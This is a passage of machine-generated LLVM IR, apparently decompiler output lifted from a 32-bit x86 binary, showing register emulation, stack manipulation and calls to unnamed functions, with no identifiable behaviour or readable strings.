  %v3_804de9f = call i32 @function_8051c10(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804de9f, i32* %eax.global-to-local, align 4
  %v0_804dea4 = load i32, i32* @esp, align 4
  %v1_804dea4 = add i32 %v0_804dea4, 8328
  %v1_804deab = inttoptr i32 %v0_804dea4 to i32*
  %v3_804deab = add i32 %v0_804dea4, 4
  %v2_804deac = add i32 %v1_804dea4, %v3_804de9f
  store i32 %v2_804deac, i32* @esi, align 4
  %v1_804deae = inttoptr i32 %v3_804deab to i32*
  %v2_804deae = load i32, i32* %v1_804deae, align 4
  store i32 %v2_804deae, i32* @ebx, align 4
  %v0_804deaf = load i32, i32* @edi, align 4
  store i32 %v0_804deaf, i32* %v1_804deae, align 4
  %v0_804deb0 = load i32, i32* @esi, align 4
  store i32 %v0_804deb0, i32* %v1_804deab, align 4
  %v3_804deb1 = call i32 @function_8051c10(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804deb1, i32* %eax.global-to-local, align 4
  store i32 %v3_804deb1, i32* @ebx, align 4
  %v0_804deb8 = load i32, i32* @esp, align 4
  %v1_804deb8 = inttoptr i32 %v0_804deb8 to i32*
  %v2_804deb8 = load i32, i32* %v1_804deb8, align 4
  store i32 %v2_804deb8, i32* %eax.global-to-local, align 4
  %v3_804deb8 = add i32 %v0_804deb8, 4
  %v1_804deb9 = inttoptr i32 %v3_804deb8 to i32*
  store i32 0, i32* %v1_804deb9, align 4
  store i32 7, i32* %v1_804deb8, align 4
  %v3_804debe = call i32 @function_80511f0(i32 0, i32* nonnull @0)
  store i32 %v3_804debe, i32* %eax.global-to-local, align 4
  %v0_804dec3 = load i32, i32* @esp, align 4
  %v1_804dec3 = inttoptr i32 %v0_804dec3 to i32*
  %v3_804dec3 = add i32 %v0_804dec3, 4
  %v1_804dec4 = inttoptr i32 %v3_804dec3 to i32*
  store i32 %v3_804debe, i32* %v1_804dec4, align 4
  %v0_804dec6 = load i32, i32* @esi, align 4
  %v1_804dec6 = load i32, i32* @ebx, align 4
  %v2_804dec6 = add i32 %v1_804dec6, %v0_804dec6
  store i32 %v2_804dec6, i32* %eax.global-to-local, align 4
  store i32 %v2_804dec6, i32* %v1_804dec3, align 4
  %v3_804deca = call i32 @function_8051c10(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804deca, i32* %eax.global-to-local, align 4
  %v0_804decf = load i32, i32* @esp, align 4
  %v1_804decf = inttoptr i32 %v0_804decf to i32*
  %v3_804decf = add i32 %v0_804decf, 4
  %v1_804ded0 = inttoptr i32 %v3_804decf to i32*
  %v2_804ded0 = load i32, i32* %v1_804ded0, align 4
  store i32 %v2_804ded0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804ded0, align 4
  store i32 6, i32* %v1_804decf, align 4
  %v3_804ded5 = call i32 @function_80511f0(i32 0, i32* nonnull @0)
  store i32 %v3_804ded5, i32* %eax.global-to-local, align 4
  %v0_804deda = load i32, i32* @esp, align 4
  %v1_804deda = inttoptr i32 %v0_804deda to i32*
  %v3_804deda = add i32 %v0_804deda, 4
  %v1_804dedb = inttoptr i32 %v3_804deda to i32*
  %v2_804dedb = load i32, i32* %v1_804dedb, align 4
  store i32 %v2_804dedb, i32* @ebx, align 4
  store i32 %v3_804ded5, i32* %v1_804dedb, align 4
  %v1_804dedd = add i32 %v0_804deda, 8264
  store i32 %v1_804dedd, i32* %eax.global-to-local, align 4
  store i32 %v1_804dedd, i32* %v1_804deda, align 4
  %v3_804dee5 = call i32 @function_8051c10(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804dee5, i32* %eax.global-to-local, align 4
  %v0_804deea = load i32, i32* @esp, align 4
  %v1_804deea = add i32 %v3_804dee5, 8264
  %v2_804def1 = add i32 %v1_804deea, %v0_804deea
  store i32 %v2_804def1, i32* @esi, align 4
  %v1_804def3 = inttoptr i32 %v0_804deea to i32*
  %v2_804def3 = load i32, i32* %v1_804def3, align 4
  store i32 %v2_804def3, i32* %eax.global-to-local, align 4
  %v3_804def3 = add i32 %v0_804deea, 4
  %v1_804def4 = inttoptr i32 %v3_804def3 to i32*
  %v0_804def5 = load i32, i32* @edi, align 4
  store i32 %v0_804def5, i32* %v1_804def4, align 4
  %v0_804def6 = load i32, i32* @esi, align 4
  store i32 %v0_804def6, i32* %v1_804def3, align 4
  %v3_804def7 = call i32 @function_8051c10(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804def7, i32* %eax.global-to-local, align 4
  %v0_804defc = load i32, i32* @esp, align 4
  %v1_804defc = inttoptr i32 %v0_804defc to i32*
  %v3_804defc = add i32 %v0_804defc, 4
  %v1_804defd = inttoptr i32 %v3_804defc to i32*
  store i32 %v3_804def7, i32* @ebx, align 4
  store i32 0, i32* %v1_804defd, align 4
  store i32 11, i32* %v1_804defc, align 4
  %v3_804df04 = call i32 @function_80511f0(i32 0, i32* nonnull @0)
  store i32 %v3_804df04, i32* %eax.global-to-local, align 4
  %v0_804df09 = load i32, i32* @esp, align 4
  %v1_804df09 = inttoptr i32 %v0_804df09 to i32*
  %v3_804df09 = add i32 %v0_804df09, 4
  %v1_804df0a = inttoptr i32 %v3_804df09 to i32*
  store i32 %v3_804df04, i32* %v1_804df0a, align 4
  %v0_804df0c = load i32, i32* @esi, align 4
  %v1_804df0c = load i32, i32* @ebx, align 4
  %v2_804df0c = add i32 %v1_804df0c, %v0_804df0c
  store i32 %v2_804df0c, i32* %eax.global-to-local, align 4
  store i32 %v2_804df0c, i32* %v1_804df09, align 4
  %v3_804df10 = call i32 @function_8051c10(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804df10, i32* %eax.global-to-local, align 4
  %v0_804df15 = load i32, i32* @esp, align 4
  %v1_804df15 = inttoptr i32 %v0_804df15 to i32*
  store i32 6, i32* %v1_804df15, align 4
  %v2_804df1c = call i32 @function_8051220(i8 0)
  store i32 %v2_804df1c, i32* %eax.global-to-local, align 4
  %v0_804df21 = load i32, i32* @esp, align 4
  %v1_804df21 = inttoptr i32 %v0_804df21 to i32*
  store i32 7, i32* %v1_804df21, align 4
  %v2_804df28 = call i32 @function_8051220(i8 0)
  %v0_804df2d = load i32, i32* @esp, align 4
  %v1_804df30 = add i32 %v0_804df2d, 8
  %v2_804df30 = inttoptr i32 %v1_804df30 to i32*
  store i32 4095, i32* %v2_804df30, align 4
  %v1_804df35 = add i32 %v0_804df2d, 4168
  store i32 %v1_804df35, i32* @edi, align 4
  %v2_804df3c = add i32 %v0_804df2d, 4
  %v3_804df3c = inttoptr i32 %v2_804df3c to i32*
  store i32 %v1_804df35, i32* %v3_804df3c, align 4
  %v1_804df3d = add i32 %v0_804df2d, 8328
  store i32 %v1_804df3d, i32* %eax.global-to-local, align 4
  %v3_804df44 = inttoptr i32 %v0_804df2d to i32*
  store i32 %v1_804df3d, i32* %v3_804df44, align 4
  %v4_804df45 = call i32 @function_8052362(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804df45, i32* %eax.global-to-local, align 4
  %v0_804df4a = load i32, i32* @esp, align 4
  %v1_804df4a = add i32 %v0_804df4a, 16
  store i32 %v4_804df45, i32* @ebx, align 4
  %v10_804df4f = icmp eq i32 %v4_804df45, -1
  br i1 %v10_804df4f, label %dec_label_pc_804e077, label %dec_label_pc_804df58

dec_label_pc_804df58:                             ; preds = %dec_label_pc_804de63
  %v2_804df58 = add i32 %v4_804df45, 4152
  %v3_804df58 = add i32 %v2_804df58, %v1_804df4a
  %v4_804df58 = inttoptr i32 %v3_804df58 to i8*
  store i8 0, i8* %v4_804df58, align 1
  %v0_804df60 = load i32, i32* @esp, align 4
  %v1_804df63 = add i32 %v0_804df60, -16
  %v2_804df63 = inttoptr i32 %v1_804df63 to i32*
  store i32 10, i32* %v2_804df63, align 4
  %v2_804df65 = call i32 @function_80512a0(i8 0)
  store i32 %v2_804df65, i32* %eax.global-to-local, align 4
  %v0_804df6a = load i32, i32* @esp, align 4
  %v1_804df6a = inttoptr i32 %v0_804df6a to i32*
  %v3_804df6a = add i32 %v0_804df6a, 4
  %v1_804df6b = inttoptr i32 %v3_804df6a to i32*
  %v2_804df6b = load i32, i32* %v1_804df6b, align 4
  store i32 %v2_804df6b, i32* @esi, align 4
  store i32 0, i32* %v1_804df6b, align 4
  store i32 10, i32* %v1_804df6a, align 4
  %v3_804df70 = call i32 @function_80511f0(i32 0, i32* nonnull @0)
  %v0_804df75 = load i32, i32* @esp, align 4
  %v2_804df78 = add i32 %v0_804df75, 8
  %v3_804df78 = inttoptr i32 %v2_804df78 to i32*
  store i32 %v3_804df70, i32* %v3_804df78, align 4
  %v0_804df79 = load i32, i32* @ebx, align 4
  %v1_804df79 = add i32 %v0_804df79, -1
  store i32 %v1_804df79, i32* %eax.global-to-local, align 4
  %v2_804df7c = add i32 %v0_804df75, 4
  %v3_804df7c = inttoptr i32 %v2_804df7c to i32*
  store i32 %v1_804df79, i32* %v3_804df7c, align 4
  %v1_804df7d = add i32 %v0_804df75, 4168
  store i32 %v1_804df7d, i32* @edi, align 4
  %v3_804df84 = inttoptr i32 %v0_804df75 to i32*
  store i32 %v1_804df7d, i32* %v3_804df84, align 4
  %v4_804df85 = call i32 @function_8051ee0(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804df8a = load i32, i32* @esp, align 4
  %v1_804df8d = add i32 %v4_804df85, 1
  %v8_804df8d = icmp eq i32 %v1_804df8d, 0
  store i32 %v1_804df8d, i32* %eax.global-to-local, align 4
  br i1 %v8_804df8d, label %dec_label_pc_804dfad, label %dec_label_pc_804df90

dec_label_pc_804df90:                             ; preds = %dec_label_pc_804df58
  %v1_804df93 = add i32 %v0_804df8a, 4168
  store i32 %v1_804df93, i32* %eax.global-to-local, align 4
  %v3_804df9a = inttoptr i32 %v0_804df8a to i32*
  store i32 %v1_804df93, i32* %v3_804df9a, align 4
  %v0_804df9b = call i32 @function_8052480()
  store i32 %v0_804df9b, i32* %eax.global-to-local, align 4
  %v0_804dfa0 = load i32, i32* @esp, align 4
  %v1_804dfa0 = inttoptr i32 %v0_804dfa0 to i32*
  %v2_804dfa0 = load i32, i32* %v1_804dfa0, align 4
  store i32 %v2_804dfa0, i32* %eax.global-to-local, align 4
  %v3_804dfa0 = add i32 %v0_804dfa0, 4
  %v1_804dfa1 = inttoptr i32 %v3_804dfa0 to i32*
  store i32 9, i32* %v1_804dfa1, align 4
  %v0_804dfa4 = load i32, i32* @ebp, align 4
  store i32 %v0_804dfa4, i32* %v1_804dfa0, align 4
  %v4_804dfa5 = call i32 @function_8052270(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804dfa5, i32* %eax.global-to-local, align 4
  %v0_804dfaa = load i32, i32* @esp, align 4
  br label %dec_label_pc_804dfad

dec_label_pc_804dfad:                             ; preds = %dec_label_pc_804df58, %dec_label_pc_804df90
  %v0_804dfad.in = phi i32 [ %v0_804df8a, %dec_label_pc_804df58 ], [ %v0_804dfaa, %dec_label_pc_804df90 ]
  %v2_804dfb0 = inttoptr i32 %v0_804dfad.in to i32*
  store i32 10, i32* %v2_804dfb0, align 4
  %v2_804dfb2 = call i32 @function_8051220(i8 0)
  store i32 %v2_804dfb2, i32* %eax.global-to-local, align 4
  %v0_804dfb7 = call i32 @function_80521e5()
  store i32 %v0_804dfb7, i32* %eax.global-to-local, align 4
  %v0_804dfbc = load i32, i32* @esp, align 4
  %v1_804dfbc = add i32 %v0_804dfbc, 16
  %v0_804dfbf = load i32, i32* @ebp, align 4
  %v12_804dfbf = icmp eq i32 %v0_804dfbf, %v0_804dfb7
  br i1 %v12_804dfbf, label %dec_label_pc_804dfe8, label %dec_label_pc_804dfc3

dec_label_pc_804dfc3:                             ; preds = %dec_label_pc_804dfad
  %v0_804dfc3 = call i32 @function_805220b()
  store i32 %v0_804dfc3, i32* %eax.global-to-local, align 4
  %v0_804dfc8 = load i32, i32* @ebp, align 4
  %v12_804dfc8 = icmp eq i32 %v0_804dfc8, %v0_804dfc3
  %v0_804dfea.pre = load i32, i32* @esp, align 4
  br i1 %v12_804dfc8, label %dec_label_pc_804dfe8, label %dec_label_pc_804dfcc

dec_label_pc_804dfcc:                             ; preds = %dec_label_pc_804dfc3
  %v2_804dfcc = add i32 %v0_804dfea.pre, -4
  %v3_804dfcc = inttoptr i32 %v2_804dfcc to i32*
  store i32 %v0_804dfc3, i32* %v3_804dfcc, align 4
  %v2_804dfcd = add i32 %v0_804dfea.pre, -8
  %v3_804dfcd = inttoptr i32 %v2_804dfcd to i32*
  store i32 %v0_804dfc3, i32* %v3_804dfcd, align 4
  %v0_804dfce = load i32, i32* @global_var_8056920.22, align 32
  store i32 %v0_804dfce, i32* %eax.global-to-local, align 4
  %v2_804dfd3 = add i32 %v0_804dfea.pre, -12
  %v3_804dfd3 = inttoptr i32 %v2_804dfd3 to i32*
  store i32 %v0_804dfce, i32* %v3_804dfd3, align 4
  %v1_804dfd4 = add i32 %v0_804dfea.pre, 4152
  store i32 %v1_804dfd4, i32* @edi, align 4
  %v2_804dfdb = add i32 %v0_804dfea.pre, -16
  %v3_804dfdb = inttoptr i32 %v2_804dfdb to i32*
  store i32 %v1_804dfd4, i32* %v3_804dfdb, align 4
  %v0_804dfdc = call i32 @function_8051f60()
  store i32 %v0_804dfdc, i32* %eax.global-to-local, align 4
  %v0_804dfe1 = load i32, i32* @esp, align 4
  %v3_804dfe4 = trunc i32 %v0_804dfdc to i8
  %v4_804dfe4 = icmp eq i8 %v3_804dfe4, 0
  br i1 %v4_804dfe4, label %dec_label_pc_804e043, label %dec_label_pc_804dfcc.dec_label_pc_804dfe8_crit_edge

dec_label_pc_804dfcc.dec_label_pc_804dfe8_crit_edge: ; preds = %dec_label_pc_804dfcc
  %v1_804dfe1 = add i32 %v0_804dfe1, 16
  %v0_804dfe8.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804dfe8

dec_label_pc_804dfe8:                             ; preds = %dec_label_pc_804dfc3, %dec_label_pc_804dfcc.dec_label_pc_804dfe8_crit_edge, %dec_label_pc_804dfad
  %v0_804dfea = phi i32 [ %v1_804dfe1, %dec_label_pc_804dfcc.dec_label_pc_804dfe8_crit_edge ], [ %v1_804dfbc, %dec_label_pc_804dfad ], [ %v0_804dfea.pre, %dec_label_pc_804dfc3 ]
  %v0_804dfe8 = phi i32 [ %v0_804dfe8.pre, %dec_label_pc_804dfcc.dec_label_pc_804dfe8_crit_edge ], [ %v0_804dfb7, %dec_label_pc_804dfad ], [ %v0_804dfc3, %dec_label_pc_804dfc3 ]
  store i32 %v0_804dfe8, i32* @esi, align 4
  %v1_804dfea = add i32 %v0_804dfea, 8
  %v2_804dfea = inttoptr i32 %v1_804dfea to i32*
  %v3_804dfea = load i32, i32* %v2_804dfea, align 4
  store i32 %v3_804dfea, i32* @ebx, align 4
  br label %dec_label_pc_804de00

dec_label_pc_804dff3:                             ; preds = %dec_label_pc_804de00
  %v1_804dff6 = add i32 %v0_804de0d, 32
  %v2_804dff6 = inttoptr i32 %v1_804dff6 to i32*
  %v3_804dff6 = load i32, i32* %v2_804dff6, align 4
  store i32 %v3_804dff6, i32* @eax, align 4
  %v3_804dffa = inttoptr i32 %v0_804de0d to i32*
  store i32 %v3_804dff6, i32* %v3_804dffa, align 4
  %v0_804dffb = call i32 @function_80524e4()
  store i32 %v0_804dffb, i32* %eax.global-to-local, align 4
  %v0_804e000 = load i32, i32* @esp, align 4
  %v1_804e000 = add i32 %v0_804e000, 16
  br label %dec_label_pc_804ddc0

dec_label_pc_804e008:                             ; preds = %dec_label_pc_804de42
  %v0_804e008 = load i32, i32* @ebp, align 4
  %v7_804e00e = icmp sgt i32 %v0_804e008, 400
  br i1 %v7_804e00e, label %dec_label_pc_804e014, label %dec_label_pc_804de00

dec_label_pc_804e014:                             ; preds = %dec_label_pc_804e008
  store i32 -858993459, i32* %eax.global-to-local, align 4
  %v1_804e019 = add i32 %v0_804de4e, 28
  %v2_804e019 = inttoptr i32 %v1_804e019 to i32*
  %v3_804e019 = load i32, i32* %v2_804e019, align 4
  %v10_804e019 = udiv i32 %v3_804e019, 2
  store i32 %v10_804e019, i32* @edx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_804e027 = load i32, i32* %v2_804e019, align 4
  %v15_804e027 = icmp eq i32 %v3_804e027, 0
  %v1_804e02b = icmp eq i1 %v15_804e027, false
  br i1 %v1_804e02b, label %dec_label_pc_804de00, label %dec_label_pc_804e031

dec_label_pc_804e031:                             ; preds = %dec_label_pc_804e014
  %v2_804e034 = inttoptr i32 %v0_804de4e to i32*
  store i32 1, i32* %v2_804e034, align 4
  %v1_804e036 = call i32 @function_8053d40(i32 0)
  store i32 %v1_804e036, i32* %eax.global-to-local, align 4
  %v0_804e03b = load i32, i32* @esp, align 4
  %v1_804e03b = add i32 %v0_804e03b, 16
  br label %dec_label_pc_804de00

dec_label_pc_804e043:                             ; preds = %dec_label_pc_804dfcc
  %v2_804e043 = add i32 %v0_804dfe1, 12
  %v3_804e043 = inttoptr i32 %v2_804e043 to i32*
  store i32 %v0_804dfdc, i32* %v3_804e043, align 4
  %v2_804e044 = add i32 %v0_804dfe1, 8
  %v3_804e044 = inttoptr i32 %v2_804e044 to i32*
  store i32 %v0_804dfdc, i32* %v3_804e044, align 4
  %v1_804e045 = add i32 %v0_804dfe1, 4
  %v2_804e045 = inttoptr i32 %v1_804e045 to i32*
  store i32 0, i32* %v2_804e045, align 4
  %v1_804e047 = add i32 %v0_804dfe1, 4168
  store i32 %v1_804e047, i32* %eax.global-to-local, align 4
  %v3_804e04e = inttoptr i32 %v0_804dfe1 to i32*
  store i32 %v1_804e047, i32* %v3_804e04e, align 4
  %v3_804e04f = call i32 @function_80522a2(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e04f, i32* %eax.global-to-local, align 4
  %v0_804e054 = load i32, i32* @esp, align 4
  store i32 %v3_804e04f, i32* @ebx, align 4
  %v10_804e059 = icmp eq i32 %v3_804e04f, -1
  %v1_804e05c = icmp eq i1 %v10_804e059, false
  br i1 %v1_804e05c, label %dec_label_pc_804e06b, label %dec_label_pc_804e05e

dec_label_pc_804e05e:                             ; preds = %dec_label_pc_804e043
  %v0_804e05e = load i32, i32* @edi, align 4
  %v2_804e05e = add i32 %v0_804e054, 12
  %v3_804e05e = inttoptr i32 %v2_804e05e to i32*
  store i32 %v0_804e05e, i32* %v3_804e05e, align 4
  %v0_804e05f = load i32, i32* @edi, align 4
  %v2_804e05f = add i32 %v0_804e054, 8
  %v3_804e05f = inttoptr i32 %v2_804e05f to i32*
  store i32 %v0_804e05f, i32* %v3_804e05f, align 4
  %v1_804e060 = add i32 %v0_804e054, 4
  %v2_804e060 = inttoptr i32 %v1_804e060 to i32*
  store i32 9, i32* %v2_804e060, align 4
  %v0_804e062 = load i32, i32* @ebp, align 4
  %v3_804e062 = inttoptr i32 %v0_804e054 to i32*
  store i32 %v0_804e062, i32* %v3_804e062, align 4
  %v4_804e063 = call i32 @function_8052270(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e063, i32* %eax.global-to-local, align 4
  %v0_804e068 = load i32, i32* @esp, align 4
  %v0_804e06e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e06b

dec_label_pc_804e06b:                             ; preds = %dec_label_pc_804e043, %dec_label_pc_804e05e
  %v0_804e06e = phi i32 [ %v3_804e04f, %dec_label_pc_804e043 ], [ %v0_804e06e.pre, %dec_label_pc_804e05e ]
  %v0_804e06b.in = phi i32 [ %v0_804e054, %dec_label_pc_804e043 ], [ %v0_804e068, %dec_label_pc_804e05e ]
  %v3_804e06e = inttoptr i32 %v0_804e06b.in to i32*
  store i32 %v0_804e06e, i32* %v3_804e06e, align 4
  %v1_804e06f = call i32 @function_8052191(i32 0)
  store i32 %v1_804e06f, i32* %eax.global-to-local, align 4
  %v0_804e074 = load i32, i32* @esp, align 4
  %v1_804e074 = add i32 %v0_804e074, 16
  br label %dec_label_pc_804e077

dec_label_pc_804e077:                             ; preds = %dec_label_pc_804de63, %dec_label_pc_804e06b
  %v1_804e077 = phi i32 [ %v1_804df4a, %dec_label_pc_804de63 ], [ %v1_804e074, %dec_label_pc_804e06b ]
  %v0_804e077 = load i32, i32* @esi, align 4
  %v2_804e077 = add i32 %v1_804e077, -4
  %v3_804e077 = inttoptr i32 %v2_804e077 to i32*
  store i32 %v0_804e077, i32* %v3_804e077, align 4
  %v0_804e078 = load i32, i32* @esi, align 4
  %v2_804e078 = add i32 %v1_804e077, -8
  %v3_804e078 = inttoptr i32 %v2_804e078 to i32*
  store i32 %v0_804e078, i32* %v3_804e078, align 4
  %v1_804e079 = add i32 %v1_804e077, -12
  %v2_804e079 = inttoptr i32 %v1_804e079 to i32*
  store i32 0, i32* %v2_804e079, align 4
  %v1_804e07b = add i32 %v1_804e077, 8312
  %v2_804e082 = add i32 %v1_804e077, -16
  %v3_804e082 = inttoptr i32 %v2_804e082 to i32*
  store i32 %v1_804e07b, i32* %v3_804e082, align 4
  %v3_804e083 = call i32 @function_80522a2(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v1_804e088 = load i32, i32* @esp, align 4
  %v2_804e088 = add i32 %v1_804e088, 56
  %v3_804e088 = inttoptr i32 %v2_804e088 to i32*
  store i32 %v3_804e083, i32* %v3_804e088, align 4
  %v0_804e08c = load i32, i32* @esp, align 4
  %v1_804e08f = add i32 %v3_804e083, 1
  %v8_804e08f = icmp eq i32 %v1_804e08f, 0
  store i32 %v1_804e08f, i32* @eax, align 4
  br i1 %v8_804e08f, label %dec_label_pc_804e2cc, label %dec_label_pc_804e096

dec_label_pc_804e096:                             ; preds = %dec_label_pc_804e077
  %v2_804e099 = inttoptr i32 %v0_804e08c to i32*
  store i32 12, i32* %v2_804e099, align 4
  %v2_804e09b = call i32 @function_80512a0(i8 0)
  store i32 %v2_804e09b, i32* %eax.global-to-local, align 4
  %v0_804e0a0 = load i32, i32* @esp, align 4
  %v1_804e0a0 = inttoptr i32 %v0_804e0a0 to i32*
  store i32 13, i32* %v1_804e0a0, align 4
  %v2_804e0a7 = call i32 @function_80512a0(i8 0)
  store i32 %v2_804e0a7, i32* %eax.global-to-local, align 4
  %v0_804e0ac = load i32, i32* @esp, align 4
  %v1_804e0ac = inttoptr i32 %v0_804e0ac to i32*
  store i32 14, i32* %v1_804e0ac, align 4
  %v2_804e0b3 = call i32 @function_80512a0(i8 0)
  store i32 %v2_804e0b3, i32* %eax.global-to-local, align 4
  %v0_804e0b8 = load i32, i32* @esp, align 4
  %v1_804e0b8 = inttoptr i32 %v0_804e0b8 to i32*
  store i32 15, i32* %v1_804e0b8, align 4
  %v2_804e0bf = call i32 @function_80512a0(i8 0)
  store i32 %v2_804e0bf, i32* %eax.global-to-local, align 4
  %v0_804e0c4 = load i32, i32* @esp, align 4
  %v1_804e0c4 = inttoptr i32 %v0_804e0c4 to i32*
  store i32 16, i32* %v1_804e0c4, align 4
  %v2_804e0cb = call i32 @function_80512a0(i8 0)
  store i32 %v2_804e0cb, i32* %eax.global-to-local, align 4
  %v0_804e0d0 = load i32, i32* @esp, align 4
  %v1_804e0d0 = inttoptr i32 %v0_804e0d0 to i32*
  %v3_804e0d0 = add i32 %v0_804e0d0, 4
  %v1_804e0d1 = inttoptr i32 %v3_804e0d0 to i32*
  %v1_804e0d2 = add i32 %v0_804e0d0, 8436
  store i32 %v1_804e0d2, i32* %eax.global-to-local, align 4
  store i32 %v1_804e0d2, i32* %v1_804e0d1, align 4
  store i32 12, i32* %v1_804e0d0, align 4
  %v3_804e0dc = call i32 @function_80511f0(i32 0, i32* nonnull @0)
  store i32 %v3_804e0dc, i32* %eax.global-to-local, align 4
  %v1_804e0e1 = load i32, i32* @esp, align 4
  %v2_804e0e1 = add i32 %v1_804e0e1, 52
  %v3_804e0e1 = inttoptr i32 %v2_804e0e1 to i32*
  store i32 %v3_804e0dc, i32* %v3_804e0e1, align 4
  %v0_804e0e5 = load i32, i32* @esp, align 4
  %v1_804e0e5 = inttoptr i32 %v0_804e0e5 to i32*
  %v3_804e0e5 = add i32 %v0_804e0e5, 4
  %v1_804e0e6 = inttoptr i32 %v3_804e0e5 to i32*
  %v1_804e0e7 = add i32 %v0_804e0e5, 8432
  store i32 %v1_804e0e7, i32* %eax.global-to-local, align 4
  store i32 %v1_804e0e7, i32* %v1_804e0e6, align 4
  store i32 13, i32* %v1_804e0e5, align 4
  %v3_804e0f1 = call i32 @function_80511f0(i32 0, i32* nonnull @0)
  store i32 %v3_804e0f1, i32* %eax.global-to-local, align 4
  %v1_804e0f6 = load i32, i32* @esp, align 4
  %v2_804e0f6 = add i32 %v1_804e0f6, 48
  %v3_804e0f6 = inttoptr i32 %v2_804e0f6 to i32*
  store i32 %v3_804e0f1, i32* %v3_804e0f6, align 4
  %v0_804e0fa = load i32, i32* @esp, align 4
  %v1_804e0fa = inttoptr i32 %v0_804e0fa to i32*
  %v3_804e0fa = add i32 %v0_804e0fa, 4
  %v1_804e0fb = inttoptr i32 %v3_804e0fa to i32*
  %v2_804e0fb = load i32, i32* %v1_804e0fb, align 4
  store i32 %v2_804e0fb, i32* @edi, align 4
  %v1_804e0fc = add i32 %v0_804e0fa, 8428
  store i32 %v1_804e0fc, i32* %eax.global-to-local, align 4
  store i32 %v1_804e0fc, i32* %v1_804e0fb, align 4
  store i32 14, i32* %v1_804e0fa, align 4
  %v3_804e106 = call i32 @function_80511f0(i32 0, i32* nonnull @0)
  store i32 %v3_804e106, i32* %eax.global-to-local, align 4
  %v1_804e10b = load i32, i32* @esp, align 4
  %v2_804e10b = add i32 %v1_804e10b, 44
  %v3_804e10b = inttoptr i32 %v2_804e10b to i32*
  store i32 %v3_804e106, i32* %v3_804e10b, align 4
  %v0_804e10f = load i32, i32* @esp, align 4
  %v1_804e10f = inttoptr i32 %v0_804e10f to i32*
  %v3_804e10f = add i32 %v0_804e10f, 4
  %v1_804e110 = inttoptr i32 %v3_804e10f to i32*
  %v2_804e110 = load i32, i32* %v1_804e110, align 4
  store i32 %v2_804e110, i32* @ebx, align 4
  %v1_804e111 = add i32 %v0_804e10f, 8440
  store i32 %v1_804e111, i32* %eax.global-to-local, align 4
  store i32 %v1_804e111, i32* %v1_804e110, align 4
  store i32 15, i32* %v1_804e10f, align 4
  %v3_804e11b = call i32 @function_80511f0(i32 0, i32* nonnull @0)
  store i32 %v3_804e11b, i32* %eax.global-to-local, align 4
  %v1_804e120 = load i32, i32* @esp, align 4
  %v2_804e120 = add i32 %v1_804e120, 40
  %v3_804e120 = inttoptr i32 %v2_804e120 to i32*
  store i32 %v3_804e11b, i32* %v3_804e120, align 4
  %v0_804e124 = load i32, i32* @esp, align 4
  %v1_804e124 = inttoptr i32 %v0_804e124 to i32*
  %v3_804e124 = add i32 %v0_804e124, 4
  %v1_804e125 = inttoptr i32 %v3_804e124 to i32*
  %v1_804e126 = add i32 %v0_804e124, 8424
  store i32 %v1_804e126, i32* %eax.global-to-local, align 4
  store i32 %v1_804e126, i32* %v1_804e125, align 4
  store i32 16, i32* %v1_804e124, align 4
  %v3_804e130 = call i32 @function_80511f0(i32 0, i32* nonnull @0)
  store i32 %v3_804e130, i32* %eax.global-to-local, align 4
  %v1_804e135 = load i32, i32* @esp, align 4
  %v2_804e135 = add i32 %v1_804e135, 36
  %v3_804e135 = inttoptr i32 %v2_804e135 to i32*
  store i32 %v3_804e130, i32* %v3_804e135, align 4
  %v0_804e139 = load i32, i32* @esp, align 4
  %v1_804e139 = add i32 %v0_804e139, 16
  %v0_804e13c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e13c

dec_label_pc_804e13c:                             ; preds = %dec_label_pc_804e238, %dec_label_pc_804e250.backedge, %dec_label_pc_804e247, %dec_label_pc_804e096
  %v1_804e13c = phi i32 [ %v1_804e139, %dec_label_pc_804e096 ], [ %v0_804e247, %dec_label_pc_804e247 ], [ %v0_804e247, %dec_label_pc_804e250.backedge ], [ %v0_804e247, %dec_label_pc_804e238 ]
  %v0_804e13c = phi i32 [ %v0_804e13c.pre, %dec_label_pc_804e096 ], [ %v0_804e13c51, %dec_label_pc_804e247 ], [ %v6_804e25e, %dec_label_pc_804e250.backedge ], [ %v0_804e13c51, %dec_label_pc_804e238 ]
  %v2_804e13c = add i32 %v1_804e13c, -4
  %v3_804e13c = inttoptr i32 %v2_804e13c to i32*
  store i32 %v0_804e13c, i32* %v3_804e13c, align 4
  %v1_804e13d = add i32 %v1_804e13c, -8
  %v2_804e13d = inttoptr i32 %v1_804e13d to i32*
  store i32 4096, i32* %v2_804e13d, align 4
  %v1_804e142 = add i32 %v1_804e13c, 56
  store i32 %v1_804e142, i32* %eax.global-to-local, align 4
  %v2_804e146 = add i32 %v1_804e13c, -12
  %v3_804e146 = inttoptr i32 %v2_804e146 to i32*
  store i32 %v1_804e142, i32* %v3_804e146, align 4
  %v1_804e147 = add i32 %v1_804e13c, 40
  %v2_804e147 = inttoptr i32 %v1_804e147 to i32*
  %v3_804e147 = load i32, i32* %v2_804e147, align 4
  store i32 %v3_804e147, i32* %eax.global-to-local, align 4
  %v2_804e14b = add i32 %v1_804e13c, -16
  %v3_804e14b = inttoptr i32 %v2_804e14b to i32*
  store i32 %v3_804e147, i32* %v3_804e14b, align 4
